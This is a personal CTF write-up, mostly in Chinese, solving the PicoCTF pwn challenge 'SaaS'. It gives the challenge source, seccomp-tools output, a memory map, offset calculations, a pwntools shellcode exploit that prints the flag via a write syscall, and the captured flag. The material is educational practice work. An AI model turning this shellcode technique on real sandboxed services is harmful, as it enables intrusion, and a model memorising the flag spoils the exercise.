---
title: PicoCTF - SaaS
tags: [PicoCTF, CTF, PWN]

category: "Security｜Practice｜PicoCTF｜PWN"
---

# PicoCTF - SaaS
<!-- more -->

## Background
seccomp-tool

## Source code
:::spoiler Source Code
```cpp=
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define SIZE 0x100

// http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&arch=x86-64&as_format=inline#assembly
#define HEADER "\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"

#define FLAG_SIZE 64

char flag[FLAG_SIZE];

void load_flag() {
  int fd;
  if ((fd = open("flag.txt", O_RDONLY)) == -1)
    error(EXIT_FAILURE, errno, "open flag");
  if (read(fd, flag, FLAG_SIZE) == -1)
    error(EXIT_FAILURE, errno, "read flag");
  if (close(fd) == -1)
    error(EXIT_FAILURE, errno, "close flag");
}

void setup() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_KILL);
  int ret = 0;
  if (ctx != NULL) {
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
      SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO));
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    ret |= seccomp_load(ctx);
  }
  seccomp_release(ctx);
  if (ctx == NULL || ret)
    error(EXIT_FAILURE, 0, "seccomp");
}

int main()
{
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  load_flag();
  puts("Welcome to Shellcode as a Service!");

  void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
  memcpy(addr, HEADER, sizeof(HEADER));
  read(0, addr + sizeof(HEADER) - 1, SIZE);

  setup();
  goto *addr;
}

```
:::

## Recon
這題算簡單，很適合新手打shell code，但不知道為啥很少人解，和之前計安的某一題很像但忘記在哪邊了，也有可能是在EOF的時候打的，關於seccomp可以看這篇[^seccomp-tools-note]
```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0c0d78f23470e4613121a0d3bdc1cd5e43e49b32, not stripped
$ checksec chall
[*] '/mnt/d/NTU/CTF/PicoCTF/PWN/SaaS/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ seccomp-tools dump ./chall
Welcome to Shellcode as a Service!
123
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x0000003c  if (A == exit) goto 0012
 0006: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0012
 0007: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0013
 0008: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # write(fd, buf, count)
 0009: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0013
 0010: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0011: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```
1. 觀察source code發現有設定seccomp的保護，只開放write和exit，但在輸入之前已經先讀了flag，此時就可以直接想辦法call syswrite把東西印出來就完事了
2. 要注意libc的版本，我的local端原本是2.31但不知道為啥變成2.35，所以又花了一點時間用VM才解出來
3. 這一題難的地方在於一開始有一串shell code(HEADER)，經過online tool[^online-tool-assemble]可以知道它就是把stack上和register的東西全部清空，所以如果要找到flag所在的位址就需要撈一下memory，我的做法是直接把memory dump下來，然後string search(記得是little endian)，然後用offset算他和rip之間的相對位置

## Exploit - seccomp-tools / syswrite
算offset是這一題最煩的地方，以我的例子來說(記憶體區段如下)，flag是放在==0x000055e109602060==的地方，我執行shell code的地方是在==0x7fbb78c21000==，所以我先把0x00007f1d391e5000~0x00007f1d39215000的東西dump下來，發現在0x2e590的地方存的是==0x55e109400448==，和原本的0x000055e109602060差了一點，所以我先把後1.5bytes變成0(and operator)，然後加上offset(0x202060)，在依序把其他必要的register擺好就可以call function了
![](https://hackmd.io/_uploads/r1FxFRy23.png)


:::spoiler
```
0x000055e109400000 0x000055e109402000 0x0000000000000000 r-x /home/sbk/Downloads/SaaS/chall
0x000055e109601000 0x000055e109602000 0x0000000000001000 r-- /home/sbk/Downloads/SaaS/chall
0x000055e109602000 0x000055e109603000 0x0000000000002000 rw- /home/sbk/Downloads/SaaS/chall
0x00007fbb789cb000 0x00007fbb789ce000 0x0000000000000000 rw- 
0x00007fbb789ce000 0x00007fbb789f0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007fbb789f0000 0x00007fbb78b68000 0x0000000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007fbb78b68000 0x00007fbb78bb6000 0x000000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007fbb78bb6000 0x00007fbb78bba000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007fbb78bba000 0x00007fbb78bbc000 0x00000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007fbb78bbc000 0x00007fbb78bc0000 0x0000000000000000 rw- 
0x00007fbb78bc0000 0x00007fbb78bc2000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x00007fbb78bc2000 0x00007fbb78bd1000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x00007fbb78bd1000 0x00007fbb78bdf000 0x0000000000011000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x00007fbb78bdf000 0x00007fbb78be0000 0x000000000001f000 --- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x00007fbb78be0000 0x00007fbb78be1000 0x000000000001f000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x00007fbb78be1000 0x00007fbb78be2000 0x0000000000020000 rw- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x00007fbb78be2000 0x00007fbb78be4000 0x0000000000000000 rw- 
0x00007fbb78bf5000 0x00007fbb78bf6000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007fbb78bf6000 0x00007fbb78c19000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007fbb78c19000 0x00007fbb78c21000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007fbb78c21000 0x00007fbb78c22000 0x0000000000000000 rwx 
0x00007fbb78c22000 0x00007fbb78c23000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007fbb78c23000 0x00007fbb78c24000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007fbb78c24000 0x00007fbb78c25000 0x0000000000000000 rw- 
0x00007ffe014db000 0x00007ffe014fd000 0x0000000000000000 rw- [stack]
0x00007ffe0150d000 0x00007ffe01511000 0x0000000000000000 r-- [vvar]
0x00007ffe01511000 0x00007ffe01513000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

```
:::
```python!
from pwn import *

# r = process('./chall')
r = remote('mars.picoctf.net', 31021)
context.arch = 'amd64'
r.recvline()

# exe = ELF('./chall')

payload = asm('''
    lea rax, [rip-0x52-0x2c000+0x2e9f0]
    mov rsi, QWORD PTR [rax]
    and rsi, 0xfffffffffffff000
    add rsi, 0x202060
    mov rdi, 1
    mov rdx, 0x40
    mov rax, 1
    syscall
''')
# raw_input()
r.sendline(payload)


r.interactive()
```

```bash!
$ python exp.py
[+] Opening connection to mars.picoctf.net on port 31021: Done
[*] Switching to interactive mode
picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
```

Flag: `picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}`

## Reference
[^seccomp-tools-note]:[Simple PWN - 0x010(seccomp/Lab - rop2win)](https://hackmd.io/@SBK6401/H1NX6Bloj)
[^online-tool-assemble]:[Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm)